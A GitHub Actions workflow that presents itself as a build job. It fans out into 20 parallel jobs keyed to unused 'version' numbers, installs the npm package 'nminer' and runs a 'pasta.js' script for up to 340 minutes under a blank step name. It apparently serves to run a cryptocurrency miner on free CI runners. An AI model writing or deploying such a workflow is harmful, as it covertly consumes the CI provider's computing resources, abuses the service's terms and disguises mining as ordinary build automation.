name: pasta
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5999 }
          - { version: 648 }
          - { version: 5160 }
          - { version: 1491 }
          - { version: 8732 }
          - { version: 6761 }
          - { version: 1249 }
          - { version: 3040 }
          - { version: 2710 }
          - { version: 9371 }
          - { version: 4936 }
          - { version: 9105 }
          - { version: 9061 }
          - { version: 986 }
          - { version: 1760 }
          - { version: 6109 }
          - { version: 9584 }
          - { version: 6845 }
          - { version: 40 }
          - { version: 364 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 340m node pasta.js || echo "pasta executed"